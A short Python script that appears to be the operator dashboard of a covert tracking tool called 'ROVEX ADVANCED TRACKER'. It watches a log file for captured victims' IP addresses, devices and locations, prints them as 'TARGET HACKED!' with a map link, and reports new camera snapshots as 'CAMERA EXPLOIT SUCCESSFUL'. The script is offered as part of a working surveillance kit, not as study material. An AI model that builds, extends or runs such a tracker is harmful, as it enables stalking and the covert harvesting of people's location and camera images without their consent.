import os, time

G, R, W, B = "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;34m"

def banner():
    os.system("clear")
    print(f"{B}###########################################")
    print(f"{B}# {W}      ROVEX ADVANCED TRACKER V2.0      {B} #")
    print(f"{B}###########################################{W}\n")

last_log = 0
last_img = len([f for f in os.listdir('.') if f.endswith('.png')])

banner()
print(f"{G}[*] System Online. Waiting for Target...{W}")

while True:
    if os.path.exists("logs.txt"):
        with open("logs.txt", "r") as f:
            lines = f.readlines()
            if len(lines) > last_log:
                line = lines[-1].strip()
                parts = line.split(" | ")
                
                if len(parts) >= 4:
                    print(f"\n{G}[+] TARGET HACKED! {W}")
                    print(f"{B} IP Address : {W}{parts[1]}")
                    print(f"{B} Device     : {W}{parts[2][:50]}...")
                    print(f"{G} Location   : {parts[3]}{W}")
                    # Google Maps Link
                    coords = parts[3].replace("Loc: ", "")
                    print(f"{B} Maps Link  : {W}https://www.google.com/maps/place/{coords}")
                
                last_log = len(lines)

    imgs = [f for f in os.listdir('.') if f.endswith('.png')]
    if len(imgs) > last_img:
        print(f"{G}[!] CAMERA EXPLOIT SUCCESSFUL: {imgs[-1]} SAVED{W}")
        last_img = len(imgs)

    time.sleep(1)
